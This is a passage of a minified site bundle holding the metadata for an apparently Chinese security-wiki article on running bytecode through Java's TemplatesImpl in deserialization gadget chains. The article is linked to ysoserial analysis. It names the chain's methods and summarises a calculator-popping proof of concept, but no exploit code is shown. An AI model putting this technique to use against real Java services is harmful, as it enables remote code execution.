wEik1'blog"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",h,[(0,e.eW)("ysoserial Gadgets.createTemplatesImpl 函数分析_ysoserial templatesimpl"),(0,e.bF)(a)])])]),y])}]]),T=JSON.parse('{"path":"/codereview/%E3%80%90JavaSec%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%88%A9%E7%94%A8%20TemplatesImpl%20%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81.html","title":"利用 TemplatesImpl 执行字节码","lang":"zh-CN","frontmatter":{"title":"利用 TemplatesImpl 执行字节码","description":"defineClass 介绍之前首先还是要知道 defineClass 运行 bytecode 的利用方式，下面给出简单的代码。 使用 ClassToBase64 转换 把它编译成字节码后转换成 Base64，之后放入下面运行，成功弹出计算器。 ​image​ 利用 TemplatesImpl 执行字节码 利用链 但是在实际场景中，因为 defineC...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%88%A9%E7%94%A8%20TemplatesImpl%20%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"利用 TemplatesImpl 执行字节码"}],["meta",{"property":"og:description","content":"defineClass 介绍之前首先还是要知道 defineClass 运行 bytecode 的利用方式，下面给出简单的代码。 使用 ClassToBase64 转换 把它编译成字节码后转换成 Base64，之后放入下面运行，成功弹出计算器。 ​image​ 利用 TemplatesImpl 执行字节码 利用链 但是在实际场景中，因为 defineC..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"利用 TemplatesImpl 执行字节码\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"defineClass","slug":"defineclass","link":"#defineclass","children":[]},{"level":2,"title":"利用 TemplatesImpl 执行字节码","slug":"利用-templatesimpl-执行字节码","link":"#利用-templatesimpl-执行字节码","children":[{"level":3,"title":"利用链","slug":"利用链","link":"#利用链","children":[]},{"level":3,"title":"​getTransletInstance​","slug":"​gettransletinstance​","link":"#​gettransletinstance​","children":[]},{"level":3,"title":"getTransletClasses","slug":"gettransletclasses","link":"#gettransletclasses","children":[]},{"level":3,"title":"getTransletIndex","slug":"gettransletindex","link":"#gettransletindex","children":[]},{"level":3,"title":"getOutputProperties","slug":"getoutputproperties","link":"#getoutputproperties","children":[]},{"level":3,"title":"测试","slug":"测试","link":"#测试","children":[]}]},{"level":2,"title":"前人栽树","slug":"前人栽树","link":"#前人栽树","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":3.15,"words":946},"filePathRelative":"codereview/【JavaSec】反序列化/利用 TemplatesImpl 执行字节码.md","autoDesc":true}')}}]);